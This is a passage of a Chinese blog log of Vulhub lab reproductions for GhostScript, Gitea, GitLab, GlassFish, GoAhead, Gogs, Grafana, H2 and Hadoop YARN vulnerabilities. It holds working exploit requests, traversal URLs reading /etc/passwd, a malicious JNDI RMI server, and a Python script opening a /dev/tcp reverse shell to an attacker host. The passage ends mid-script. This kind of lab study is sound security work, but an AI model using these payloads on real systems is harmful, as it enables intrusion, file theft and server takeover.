等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p></blockquote><h2 id="漏洞复现-58"><a href="#漏洞复现-58" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>上传<a href="poc.png">poc.png</a>，将执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>。此时进入容器<code>docker compose exec web bash</code>，将可以看到/tmp/success已被创建：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/123.jpg" alt="123"></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/124.jpg" alt="124"></p><blockquote><p>可见，id命令已被成功运行。</p></blockquote><h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）</h1><blockquote><p>2018年底来自Semmle Security Research Team的Man Yue Mo发表了CVE-2018-16509漏洞的变体CVE-2018-19475，可以通过一个恶意图片绕过GhostScript的沙盒，进而在9.26以前版本的gs中执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://blog.semmle.com/ghostscript-CVE-2018-19475/">https://blog.semmle.com/ghostscript-CVE-2018-19475/</a></li><li><a href="https://bugs.ghostscript.com/show_bug.cgi?id=700153">https://bugs.ghostscript.com/show_bug.cgi?id=700153</a></li></ul></blockquote><h2 id="漏洞复现-59"><a href="#漏洞复现-59" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 将POC作为图片上传，执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>：</p><pre class="line-numbers language-none"><code class="language-none">POST /index.php HTTP/1.1Host: targetAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhOContent-Length: 279------WebKitFormBoundaryukZmnyhOContent-Disposition: form-data; name="file_upload"; filename="1.jpg"content-Type="image/png"%!PS0 1 300367 {} for{save restore} stopped {} if(%pipe%id &gt; /tmp/success &amp;&amp; cat /tmp/success) (w) file------WebKitFormBoundaryukZmnyhO--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>命令已成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/125.jpg" alt="125"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/126.jpg" alt="126"></p><blockquote><p>当然，真实环境下通常无法直接回显漏洞执行结果，你需要使用带外攻击的方式来检测漏洞。</p></blockquote><h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h1><blockquote><p>2019年1月23日晚，Artifex官方在ghostscriptf的master分支上提交合并了多达6处的修复。旨在修复 CVE-2019-6116 漏洞，该漏洞由 Google 安全研究员 Tavis 于2018年12月3日提交。该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p><p>参考链接：</p><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&amp;desc=2">https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&amp;desc=2</a></li><li><a href="https://www.anquanke.com/post/id/170255">https://www.anquanke.com/post/id/170255</a></li></ul></blockquote><h2 id="漏洞复现-60"><a href="#漏洞复现-60" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>作者给出了<a href="poc.png">POC</a>，上传这个文件，即可执行<code>id &gt; /tmp/success</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/127.jpg" alt="127"></p><h1 id="Gitea-1-4-0-目录穿越导致命令执行漏洞"><a href="#Gitea-1-4-0-目录穿越导致命令执行漏洞" class="headerlink" title="Gitea 1.4.0 目录穿越导致命令执行漏洞"></a>Gitea 1.4.0 目录穿越导致命令执行漏洞</h1><blockquote><p>Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html">https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html</a></li><li><a href="https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html">https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html</a></li></ul></blockquote><h2 id="漏洞复现-61"><a href="#漏洞复现-61" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/128.jpg" alt="128"></p><p>然后，需要执行一次<code>docker compose restart</code>重启gitea服务。（原因详见第二个参考链接）</p></blockquote><blockquote><p>由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。</p><p>打开gitea，找到刚才创建的公开项目，如<code>vulhub/repo</code>，发送如下数据包，添加一个Git LFS对象：</p><pre class="line-numbers language-none"><code class="language-none">POST /vulhub/repo.git/info/lfs/objects HTTP/1.1Host: your-ip:3000Accept-Encoding: gzip, deflateAccept: application/vnd.git-lfs+jsonAccept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 151{    "Oid": "....../../../etc/passwd",    "Size": 1000000,    "User" : "a",    "Password" : "a",    "Repo" : "a",    "Authorization" : "a"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后，访问<code>http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth</code>，即可看到<code>/etc/passwd</code>已被成功读取：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/129.jpg" alt="129"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/130.jpg" alt="130"></p><h1 id="GitLab-任意文件读取漏洞（CVE-2016-9086）"><a href="#GitLab-任意文件读取漏洞（CVE-2016-9086）" class="headerlink" title="GitLab 任意文件读取漏洞（CVE-2016-9086）"></a>GitLab 任意文件读取漏洞（CVE-2016-9086）</h1><blockquote><p>GitLab是一款Ruby开发的Git项目管理平台。在8.9版本后添加的“导出、导入项目”功能，因为没有处理好压缩包中的软连接，已登录用户可以利用这个功能读取服务器上的任意文件。</p><p>参考链接：</p><ul><li><a href="https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/">https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/</a></li><li><a href="https://hackerone.com/reports/178152">https://hackerone.com/reports/178152</a></li><li><a href="http://paper.seebug.org/104/">http://paper.seebug.org/104/</a></li></ul><p>环境运行后，访问<code>http://your-ip:8080</code>即可查看GitLab主页，其ssh端口为10022，默认管理员账号、密码是<code>root</code>、<code>vulhub123456</code>。</p><blockquote><p>注意，请使用2G及以上内存的VPS或虚拟机运行该环境，实测1G内存的机器无法正常运行GitLab（运行后502错误）。</p></blockquote></blockquote><h2 id="漏洞复现-62"><a href="#漏洞复现-62" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>注册并登录用户，新建一个项目，点击<code>GitLab export</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/131.jpg" alt="131"></p><blockquote><p>在导入页面，将<a href="test.tar.gz">test.tar.gz</a>上传，将会读取到<code>/etc/passwd</code>文件内容：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/132.jpg" alt="132"></p><h1 id="GitLab-远程命令执行漏洞（CVE-2021-22205）"><a href="#GitLab-远程命令执行漏洞（CVE-2021-22205）" class="headerlink" title="GitLab 远程命令执行漏洞（CVE-2021-22205）"></a>GitLab 远程命令执行漏洞（CVE-2021-22205）</h1><blockquote><p>GitLab是一款Ruby开发的Git项目管理平台。在11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞<a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">CVE-2021-22204</a>的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://hackerone.com/reports/1154542">https://hackerone.com/reports/1154542</a></li><li><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></li><li><a href="https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/">https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml</a></li></ul></blockquote><h2 id="漏洞复现-63"><a href="#漏洞复现-63" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>GitLab的/uploads/user接口可以上传图片且无需认证，利用<a href="poc.py">poc.py</a>脚本来测试这个漏洞：</p><pre class="line-numbers language-none"><code class="language-none">&gt;python poc.py http://your-ip:8080 "touch /tmp/success"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/133.jpg" alt="133"></p><blockquote><p>进入容器内，可见<code>touch /tmp/success</code>已成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/134.jpg" alt="134"></p><h1 id="gitlist-0-6-0-远程命令执行漏洞（CVE-2018-1000533）（未完成）"><a href="#gitlist-0-6-0-远程命令执行漏洞（CVE-2018-1000533）（未完成）" class="headerlink" title="gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）（未完成）"></a>gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）（未完成）</h1><blockquote><p> gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本及以前，存在一处命令参数注入问题，可以导致远程命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322">https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322</a></li><li><a href="https://www.exploit-db.com/exploits/44548">https://www.exploit-db.com/exploits/44548</a></li><li><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></li></ul></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/135.jpg" alt="135"><br>创建环境显示502 </p><h1 id="GlassFish-任意文件读取漏洞"><a href="#GlassFish-任意文件读取漏洞" class="headerlink" title="GlassFish 任意文件读取漏洞"></a>GlassFish 任意文件读取漏洞</h1><blockquote><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>参考链接：</p><ul><li><a href="https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904">https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904</a></li><li><a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html</a></li></ul><p>GlassFish在解码URL时，没有考虑UTF-8 Overlong Encoding攻击，导致将<code>%c0%ae</code>解析为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到目录穿越、任意文件读取的效果。</p></blockquote><h2 id="漏洞复现-64"><a href="#漏洞复现-64" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>环境运行后，访问<code>http://your-ip:8080</code>和<code>http://your-ip:4848</code>即可查看web页面。其中，8080端口是网站内容，4848端口是GlassFish管理中心。</p><p>访问<code>https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code>，发现已成功读取<code>/etc/passwd</code>内容：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/136.jpg" alt="136"></p><h1 id="GoAhead-远程命令执行漏洞（CVE-2017-17562）"><a href="#GoAhead-远程命令执行漏洞（CVE-2017-17562）" class="headerlink" title="GoAhead 远程命令执行漏洞（CVE-2017-17562）"></a>GoAhead 远程命令执行漏洞（CVE-2017-17562）</h1><blockquote><p>GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序，这个漏洞就出现在运行CGI程序的时候。</p><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了<code>REMOTE_HOST</code>和<code>HTTP_AUTHORIZATION</code>。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，<code>LD_</code>开头的环境变量和动态链接库有关，如<code>LD_PRELOAD</code>中指定的动态链接库，将会被自动加载；<code>LD_LIBRARY_PATH</code>指定的路径，程序会去其中寻找动态链接库。</p><p>我们可以指定<code>LD_PRELOAD=/proc/self/fd/0</code>，因为<code>/proc/self/fd/0</code>是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其放在POST Body中，发送给<code>http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</code>，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.elttam.com.au/blog/goahead/">https://www.elttam.com.au/blog/goahead/</a></li></ul></blockquote><h2 id="漏洞复现-65"><a href="#漏洞复现-65" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在<code>Linux x86_64</code>的机器中，所以我们直接用Linux PC编译即可。动态链接库源码：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;unistd.h&gt;static void before_main(void) __attribute__((constructor));static void before_main(void){    write(1, "Hello: World!\n", 14);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样，<code>before_main</code>函数将在程序执行前被调用。编译以上代码：</p><pre class="line-numbers language-none"><code class="language-none">gcc -shared -fPIC ./payload.c -o payload.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将payload.so作为post body发送：</p><pre class="line-numbers language-none"><code class="language-none">curl -X POST --data-binary @payload.so "http://your-ip:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0" -i <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可见，<code>Hello: world!</code>已被成功输出，说明我们的动态链接库中的代码已被执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/137.jpg" alt="137"></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/138.jpg" alt="138"></p><h1 id="GoAhead-Server-环境变量注入（CVE-2021-42342）"><a href="#GoAhead-Server-环境变量注入（CVE-2021-42342）" class="headerlink" title="GoAhead Server 环境变量注入（CVE-2021-42342）"></a>GoAhead Server 环境变量注入（CVE-2021-42342）</h1><blockquote><p>GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序。</p><p>这个漏洞是<a href="https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562">CVE-2017-17562</a>漏洞补丁的绕过，攻击者可以利用该补丁没有考虑到的multipart表单控制目标服务器的环境变量，进而劫持<code>LD_PRELOAD</code>来执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562">https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562</a></li><li><a href="https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/">https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/</a></li><li><a href="https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg">https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg</a></li></ul></blockquote><h2 id="漏洞复现-66"><a href="#漏洞复现-66" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在<code>Linux x86_64</code>的机器中，所以我们直接用Linux PC编译即可。动态链接库源码：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;unistd.h&gt;static void before_main(void) __attribute__((constructor));static void before_main(void){    write(1, "Hello: World\r\n\r\n", 16);    write(1, "Hacked\n", 7);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样，<code>before_main</code>函数将在程序执行前被调用。编译以上代码：</p><pre class="line-numbers language-none"><code class="language-none">gcc -s -shared -fPIC ./payload.c -o payload.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，我们使用<a href="poc.py">这个脚本</a>来发送恶意数据包，复现漏洞：</p><pre class="line-numbers language-none"><code class="language-none">python poc.py http://192.168.0.196:8080/cgi-bin/index payload.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可见，我们在动态链接库中编写的劫持代码已经被成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/139.jpg" alt="139"></p><h1 id="Gogs-任意用户登录漏洞（CVE-2018-18925）-未完成"><a href="#Gogs-任意用户登录漏洞（CVE-2018-18925）-未完成" class="headerlink" title="Gogs 任意用户登录漏洞（CVE-2018-18925）(未完成)"></a>Gogs 任意用户登录漏洞（CVE-2018-18925）(未完成)</h1><blockquote><p>gogs是一款极易搭建的自助Git服务平台，具有易安装、跨平台、轻量级等特点，使用者众多。</p><p>其0.11.66及以前版本中，（go-macaron/session库）没有对sessionid进行校验，攻击者利用恶意sessionid即可读取任意文件，通过控制文件内容来控制session内容，进而登录任意账户。</p><p>参考链接：</p><ul><li><a href="https://github.com/gogs/gogs/issues/5469">https://github.com/gogs/gogs/issues/5469</a></li><li><a href="https://xz.aliyun.com/t/3168">https://xz.aliyun.com/t/3168</a></li><li><a href="https://www.anquanke.com/post/id/163575">https://www.anquanke.com/post/id/163575</a></li></ul></blockquote><h2 id="漏洞复现-67"><a href="#漏洞复现-67" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 使用Gob序列化生成session文件：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">package mainimport (    "bytes"    "encoding/gob"    "encoding/hex"    "fmt"    "io/ioutil"    "os")func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {    for _, v := range obj {        gob.Register(v)    }    buf := bytes.NewBuffer(nil)    err := gob.NewEncoder(buf).Encode(obj)    return buf.Bytes(), err}func main() {    var uid int64 = 1    obj := map[interface{}]interface{}{"_old_uid": "1", "uid": uid, "uname": "root"}    data, err := EncodeGob(obj)    if err != nil {        fmt.Println(err)    }    err = ioutil.WriteFile("data", data, os.O_CREATE|os.O_WRONLY)    if err != nil {        fmt.Println(err)    }    edata := hex.EncodeToString(data)    fmt.Println(edata)}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后注册一个普通用户账户，创建项目，并在“版本发布”页面上传刚生成的session文件：</p></blockquote><p>最后一步没能成功….<img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/140.jpg" alt="140"></p><h1 id="Grafana-8-x-插件模块目录穿越漏洞（CVE-2021-43798）"><a href="#Grafana-8-x-插件模块目录穿越漏洞（CVE-2021-43798）" class="headerlink" title="Grafana 8.x 插件模块目录穿越漏洞（CVE-2021-43798）"></a>Grafana 8.x 插件模块目录穿越漏洞（CVE-2021-43798）</h1><blockquote><ul><li><p>Grafana是一个开源的度量分析与可视化套件。在2021年12月，推特用户@j0v 发表了他发现的一个0day，攻击者利用这个漏洞可以读取服务器上的任意文件。</p><p>参考链接：</p><ul><li><a href="https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/">https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/</a></li><li><a href="https://twitter.com/hacker_/status/1467880514489044993">https://twitter.com/hacker_/status/1467880514489044993</a></li><li><a href="https://nosec.org/home/detail/4914.html">https://nosec.org/home/detail/4914.html</a></li><li><a href="https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw">https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw</a></li></ul></li></ul></blockquote><h2 id="漏洞复现-68"><a href="#漏洞复现-68" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>这个漏洞出现在插件模块中，这个模块支持用户访问插件目录下的文件，但因为没有对文件名进行限制，攻击者可以利用<code>../</code>的方式穿越目录，读取到服务器上的任意文件。</p><p>利用这个漏洞前，我们需要先获取到一个已安装的插件id，比如常见的有：</p><pre class="line-numbers language-none"><code class="language-none">alertlistcloudwatchdashlistelasticsearchgraphgraphiteheatmapinfluxdbmysqlopentsdbpluginlistpostgresprometheusstackdrivertabletext<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再发送如下数据包，读取任意文件（你也可以将其中的<code>alertlist</code>换成其他合法的插件id）：</p><pre class="line-numbers language-none"><code class="language-none">GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1Host: 192.168.1.112:3000Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/141.jpg"></p><h1 id="H2-Database-Console-未授权访问"><a href="#H2-Database-Console-未授权访问" class="headerlink" title="H2 Database Console 未授权访问"></a>H2 Database Console 未授权访问</h1><blockquote><p>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：</p><pre class="line-numbers language-none"><code class="language-none">spring.h2.console.enabled=truespring.h2.console.settings.web-allow-others=true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e">https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e</a></li></ul></blockquote><h2 id="漏洞复现-69"><a href="#漏洞复现-69" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>目标环境是Java 8u252，版本较高，因为上下文是Tomcat环境，我们可以参考《<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injections in Java</a>》，使用<code>org.apache.naming.factory.BeanFactory</code>加EL表达式注入的方式来执行任意命令。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.rmi.registry.*;import com.sun.jndi.rmi.registry.*;import javax.naming.*;import org.apache.naming.ResourceRef; public class EvilRMIServerNew {    public static void main(String[] args) throws Exception {        System.out.println("Creating evil RMI registry on port 1097");        Registry registry = LocateRegistry.createRegistry(1097);         //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code        ref.add(new StringRefAddr("forceString", "x=eval"));        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"));         ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);        registry.bind("Object", referenceWrapper);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以借助这个小工具<a href="https://github.com/JosephTribbianni/JNDI">JNDI</a>简化我们的复现过程。</p><p>首先设置JNDI工具中执行的命令为<code>touch /tmp/success</code>：</p><p>然后启动<code>JNDI-1.0-all.jar</code>，在h2 console页面填入JNDI类名和URL地址：</p></blockquote><p>JNDI似乎是在github下架了 这里搞了个<a href="https://github.com/welk1n/JNDI-Injection-Exploit">替代品</a><br>输入<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success</code>  来生成我们接下来要用的payload</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/144.jpg" alt="144"></p><p>访问<code>http://your-ip:8080/h2-console/</code>即可查看h2管理器页面</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/142.jpg" alt="142"></p><blockquote><p>其中，<code>javax.naming.InitialContext</code>是JNDI的工厂类，URL是运行JNDI工具监听的RMI地址。</p></blockquote><p>点击connect 虽然会报错 但是已创建文件说明成功运行<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/143.jpg" alt="143"></p><h1 id="Hadoop-YARN-ResourceManager-未授权访问结尾-引用"><a href="#Hadoop-YARN-ResourceManager-未授权访问结尾-引用" class="headerlink" title="Hadoop YARN ResourceManager 未授权访问结尾/引用"></a>Hadoop YARN ResourceManager 未授权访问结尾/引用</h1><blockquote><h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><p>参考 <a href="http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf">http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf</a></p></blockquote><h2 id="漏洞复现-70"><a href="#漏洞复现-70" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这个连官方给的线索也不是很多..<br>我参考了<a href="https://blog.csdn.net/Aaron_Miller/article/details/106466256">这个玩意儿</a><br>机子开着监听9999端口 用下面的exp（需要修改一下细节）就能获取root账号的shell了<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/146.jpg" alt="146"></p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env pythonimport requeststarget = 'http://192.168.226.140:8088/'lhost = '192.168.226.134' # put your local host ip here, and listen at port 9999url = target + 'ws/v1/cluster/apps/new-application'resp = requests.post(url)app_id = resp.json()['application-id']url = target + 'ws/v1/cluster/apps'data = {    'application-id': app_id,    'application-name': 'get-shell',    'am-container-spec': {        'commands': {            'command': '/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1' % lhost,        },    },    'application-type': 'YARN',}requests.post(url, json=data)<span aria-hidden="true" 